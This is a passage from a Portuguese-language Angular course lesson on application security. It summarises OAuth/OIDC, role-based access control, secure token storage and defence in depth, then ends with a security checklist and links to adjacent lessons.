- Authorization Code Flow é mais seguro que Implicit Flow
- Elimina necessidade de gerenciar senhas próprias
- Use biblioteca `angular-oauth2-oidc` para integração
- Valide ID Token em OIDC para garantir identidade

**Role-Based Access Control (RBAC)**:
- RBAC controla acesso baseado em roles, não permissões individuais
- Usuários têm roles, roles têm permissões
- Guards protegem rotas baseado em roles/permissões
- Diretivas controlam visibilidade de UI
- Sempre valide no backend também

**Armazenamento Seguro**:
- httpOnly cookies são mais seguros que localStorage
- localStorage é vulnerável a XSS
- sessionStorage é mais seguro que localStorage mas ainda vulnerável
- Use estratégia híbrida: access token em memory, refresh em httpOnly cookie
- Nunca armazene tokens em variáveis globais

### Pontos-Chave para Lembrar

**Segurança em Camadas**:
- Não confie em uma única proteção
- Combine sanitização + CSP + validação + autenticação
- Cada camada adiciona proteção adicional

**Validação Dupla**:
- Valide no frontend para UX (feedback imediato)
- Valide no backend para segurança (fonte de verdade)
- Frontend pode ser contornado, backend não

**Princípio do Menor Privilégio**:
- Dê apenas permissões necessárias
- Tokens de acesso devem ter escopo limitado
- Roles devem ter apenas permissões necessárias

**Defesa em Profundidade**:
- Múltiplas camadas de proteção
- Se uma falha, outras ainda protegem
- Não há solução única para segurança

**Monitoramento e Logging**:
- Monitore tentativas de acesso
- Logue atividades suspeitas
- Configure alertas para padrões anômalos

**Atualização Contínua**:
- Mantenha Angular e dependências atualizadas
- Monitore vulnerabilidades conhecidas (CVE)
- Aplique patches de segurança rapidamente

### Checklist de Segurança

Antes de considerar sua aplicação segura, verifique:

- [ ] Todo conteúdo do usuário é sanitizado antes de renderizar
- [ ] CSP está configurado e funcionando
- [ ] Tokens CSRF estão implementados para operações de estado
- [ ] Autenticação JWT está implementada com refresh tokens
- [ ] Tokens são armazenados de forma segura (httpOnly cookies ou sessionStorage com CSP)
- [ ] RBAC está implementado com guards e validação no backend
- [ ] HTTPS está configurado em produção
- [ ] Validação de entrada está implementada no backend
- [ ] Rate limiting está configurado para login e APIs
- [ ] Logging e monitoramento estão implementados
- [ ] Erros não expõem informações sensíveis
- [ ] CORS está configurado corretamente
- [ ] Senhas são hasheadas (nunca em texto plano)
- [ ] Dependências estão atualizadas e sem vulnerabilidades conhecidas

### Próximos Passos

**Imediatos**:
- Revisar código existente para vulnerabilidades comuns
- Implementar sanitização onde necessário
- Configurar CSP em aplicações em produção
- Implementar autenticação segura se ainda não feito

**Curto Prazo**:
- Implementar RBAC completo com guards e diretivas
- Configurar rate limiting e monitoramento
- Realizar auditoria de segurança
- Documentar políticas de segurança

**Longo Prazo**:
- Estabelecer processo de revisão de segurança
- Implementar testes de segurança automatizados
- Participar de programas de bug bounty
- Manter-se atualizado com novas vulnerabilidades e proteções

**Próxima Aula**: [Aula 5.4: Arquitetura Avançada](./lesson-5-4-arquitetura.md) - Aprenderá sobre arquiteturas escaláveis, padrões avançados e organização de código em grande escala.

---

## Checklist de Qualidade

Antes de considerar esta aula completa:

- [x] Introdução clara e envolvente
- [x] Todos os conceitos têm definições e explicações detalhadas
- [x] Analogias presentes para conceitos abstratos
- [x] Diagramas ASCII para visualização de conceitos complexos
- [x] Exemplos práticos completos e funcionais
- [x] Boas práticas e anti-padrões documentados
- [x] Exercícios práticos ordenados por dificuldade
- [x] Referências externas validadas e organizadas
- [x] Resumo com pontos principais

---

**Aula Anterior**: [Aula 5.2: SSR e PWA](./lesson-5-2-ssr-pwa.md)  
**Próxima Aula**: [Aula 5.4: Arquitetura Avançada](./lesson-5-4-arquitetura.md)  
**Voltar ao Módulo**: [Módulo 5: Práticas Avançadas e Projeto Final](../modules/module-5-praticas-avancadas-projeto-final.md)
